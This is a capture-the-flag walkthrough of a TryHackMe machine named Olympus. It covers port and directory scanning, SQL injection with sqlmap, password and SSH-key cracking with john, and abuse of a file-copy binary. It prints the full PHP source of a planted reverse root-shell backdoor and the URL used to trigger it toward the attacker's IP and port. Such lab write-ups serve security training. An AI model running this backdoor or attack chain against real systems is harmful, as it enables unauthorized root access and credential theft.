## Olympus
![image](https://user-images.githubusercontent.com/6504854/193456021-8986b195-f393-4df0-bdb6-da0dda3af5f2.png)

https://tryhackme.com/room/olympusroom

## Enum
```
$ nmap -Pn -sS 10.10.158.108 -p- --min-rate=1000

Nmap scan report for 10.10.158.108
Host is up (0.43s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```
curl http://10.10.101.205/ -v             
*   Trying 10.10.101.205:80...
* Connected to 10.10.101.205 (10.10.101.205) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.101.205
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: Apache/2.4.41 (Ubuntu)
< Location: http://olympus.thm
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.101.205 left intact
```

```
echo '10.10.101.205 olympus.thm' >> /etc/hosts
```
![image](https://user-images.githubusercontent.com/6504854/193456621-17425427-b290-4c23-bc45-b23e8ed2855d.png)

```
ffuf -u http://olympus.thm/FUZZ -w=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3815ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4913ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4913ms]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 513ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 511ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 468ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 422ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 511ms]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 445ms]
:: Progress: [4713/4713] :: Job [1/1] :: 92 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/193456724-c810f856-7975-48bd-83ab-06163a2044b8.png)

![image](https://user-images.githubusercontent.com/6504854/193456835-6e460e63-0271-4046-8633-5a1827dde5b2.png)

![image](https://user-images.githubusercontent.com/6504854/193456841-cfc19573-f778-4391-b04d-266cf1b6739a.png)


```
sqlmap -r sql1.txt --batch --dump

Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password    | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y+++++++++++++ | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y+++++++++++++ | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y+++++++++++++ | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+

Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{S******************} |
+---------------------------+

```
🚩 I got flag and 3 credentials.

```
john prometeus_hash -w=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s*********       (?)     
Session completed. 
```
![image](https://user-images.githubusercontent.com/6504854/193457395-a34281ac-e979-4924-8c33-026dde6ea36b.png)

🚩 I tried to upload some revers shell but couldn't read attached file.

```
echo '10.10.101.205 chat.olympus.thm' >> /etc/hosts
```
![image](https://user-images.githubusercontent.com/6504854/193457626-cb04afd6-c759-4ae4-b66f-bbc5164a527d.png)

![image](https://user-images.githubusercontent.com/6504854/193457708-cbedf48a-c642-4179-8c53-c785a6c8faf4.png)

🚩 Surely it scceeded to upload revers shell, I had no idea of url.

```
sqlmap -r sql1.txt --dbs --tables -D olympus --dump --fresh-queries 
```
![image](https://user-images.githubusercontent.com/6504854/193457943-2042470c-2e7f-4522-bdc5-2df4637cb765.png)

![image](https://user-images.githubusercontent.com/6504854/193458242-6a40a7bd-b467-4f5c-8475-f372eb983363.png)

🚩 I found /uploads/ via ffuf. 

## Flag
```
$ cd /home/zeus
$ ls -la
total 808
drwxr-xr-x 7 zeus zeus   4096 Oct  2 12:12 .
drwxr-xr-x 3 root root   4096 Mar 22  2022 ..
lrwxrwxrwx 1 root root      9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus   3771 Feb 25  2020 .bashrc
drwx------ 2 zeus zeus   4096 Mar 22  2022 .cache
drwx------ 3 zeus zeus   4096 Oct  2 12:14 .gnupg
drwxrwxr-x 3 zeus zeus   4096 Mar 23  2022 .local
-rw-r--r-- 1 zeus zeus    807 Feb 25  2020 .profile
drwx------ 2 zeus zeus   4096 Apr 14 10:35 .ssh
-rw-r--r-- 1 zeus zeus      0 Mar 22  2022 .sudo_as_admin_successful
-rwxrwxr-x 1 zeus zeus 776967 Jul  2 13:53 linpeas.sh
drwx------ 3 zeus zeus   4096 Apr 14 09:56 snap
-rw-rw-r-- 1 zeus zeus     34 Mar 23  2022 user.flag
-r--r--r-- 1 zeus zeus    199 Apr 15 07:28 zeus.txt
$ cat user.flag
flag{Y*************************R}
$ cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.
                                                - Prometheus
```
```
find / -user zeus -type f 2>/dev/null

/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.bashrc
/home/zeus/.profile
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/crash/_usr_bin_cp-utils.1000.crash
```
🚩 /usr/bin/cputils 🤔🤔🤔

```
$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
```
🚩 Open with vim and Copy & Paste to the local file. id_rsa needed pass.

```
ssh2john zeus_rsa > hash

john hash -w=/usr/share/wordlists/rockyou.tx

ssh zeus@olympus.thm -i zeus_rsa
```

```
find /var/www -group zeus 2>/dev/null

/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```
🚩 I couldn't find files and checked writeups. 😃

```
cat /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php

<?php
$pass = "a7*********************************9";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```
🚩 Prometeus means this backdoor? 🤔

![image](https://user-images.githubusercontent.com/6504854/193459996-3eae9de3-6eeb-48ff-96fd-f14a44049654.png)

```
http://10.10.101.205/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=YOURIP&port=2222
```
🚩 fill in the password and set parameter.

```
python3 -c 'import pty; pty.spawn("/bin/bash")';

id
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)

cat /root/root.flag

grep -ri "flag{" /etc
/etc/ssl/private/.b0nus.fl4g:flag{Y***************!}
```

㊗️㊗️㊗️ Thank you for your time, Happy Hacking 😄


